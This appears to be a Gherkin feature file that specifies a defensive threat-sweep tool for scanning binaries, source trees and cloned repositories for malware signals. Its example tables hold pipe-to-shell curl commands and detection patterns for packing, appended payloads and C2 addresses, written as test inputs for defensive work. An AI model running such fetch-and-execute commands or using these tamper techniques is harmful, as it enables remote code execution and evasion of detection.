@domain:developer-tooling @area:threat-sweep @from:azkaban/audit
Feature: Sweeping a tree or binary for threats
  Lets a maintainer or reviewer triage a source tree, remote repository or compiled binary for malware signals without executing any of its code, with an exit code a CI wrapper can act on.

  @id:developer-tooling.threat-sweep.001 @rule:tooling.threat-sweep.binary-verdict-follows-tamper-signals @verified @source:audit.sh#audit_binary @test:audit_test.go#TestAuditBinary_VerdictFollowsTamperSignals @test:audit_test.go#TestAuditBinary_AppendedPayloadIsFlagged
  Scenario Outline: A binary is flagged suspicious only when it carries a tamper signal
    Given a file that <content>
    When the maintainer runs the threat sweep on that file
    Then the output names "<signal>"
    And the verdict reads "<verdict>"
    And the sweep exits with <code>

    Examples:
      | content                                                 | signal                  | verdict           | code |
      | contains only ordinary text                             | BINARY TRIAGE           | NO TAMPER SIGNALS | 0    |
      | carries UPX packer magic                                | packed (UPX)            | SUSPICIOUS        | 1    |
      | embeds a pastebin.com address                           | C2/pipe-to-shell string | SUSPICIOUS        | 1    |
      | embeds "curl http://x/y \| sh"                          | C2/pipe-to-shell string | SUSPICIOUS        | 1    |
      | is an ELF with 8 KiB appended after its section headers | after section headers   | SUSPICIOUS        | 1    |
      | has zip or 7z archive magic in its last 256 KiB         | embedded archive magic  | SUSPICIOUS        | 1    |

  @id:developer-tooling.threat-sweep.002 @rule:tooling.threat-sweep.directory-verdict-from-high-signal-patterns @inferred @source:audit.sh#flag
  Scenario Outline: A source tree is flagged suspicious when non-test code matches a high-signal pattern
    Given a source tree <content>
    When the maintainer runs the threat sweep on that directory
    Then the verdict reads "<verdict>"
    And the sweep exits with <code>

    Examples:
      | content                                                     | verdict                         | code |
      | whose install.sh contains "curl https://example.com/i \| sh" | SUSPICIOUS                      | 1    |
      | with a committed ELF executable                             | SUSPICIOUS                      | 1    |
      | with a setuid file                                          | SUSPICIOUS                      | 1    |
      | whose only pipe-to-shell line is in a file under /tests/    | NO HIGH-SIGNAL PATTERNS MATCHED | 0    |
      | with no scored pattern anywhere                             | NO HIGH-SIGNAL PATTERNS MATCHED | 0    |

  @id:developer-tooling.threat-sweep.003 @rule:tooling.threat-sweep.remote-repo-swept-without-running-its-code @inferred @source:audit.sh
  Scenario Outline: A remote repository is cloned and swept without any way to run code from it
    Given a repository URL <target>
    When the maintainer runs the threat sweep on that URL
    Then <outcome>
    And the temporary clone is deleted when the sweep ends

    Examples:
      | target                                | outcome                                                                                               |
      | https://git.example.com/acme/tool.git | the checkout is swept like any directory and "Cloning https://git.example.com/acme/tool.git" is shown |
      | that cannot be cloned                 | "clone failed: <url>" is shown and the sweep exits with 2                                             |

  @id:developer-tooling.threat-sweep.004 @rule:tooling.threat-sweep.bad-target-refused @inferred @source:audit.sh
  Scenario: A target that is neither a file, a directory nor a repository URL is refused
    Given no file or directory exists at "./missing-thing"
    When the maintainer runs the threat sweep on "./missing-thing"
    Then "not a file or directory: ./missing-thing" is shown
    And the sweep exits with 2
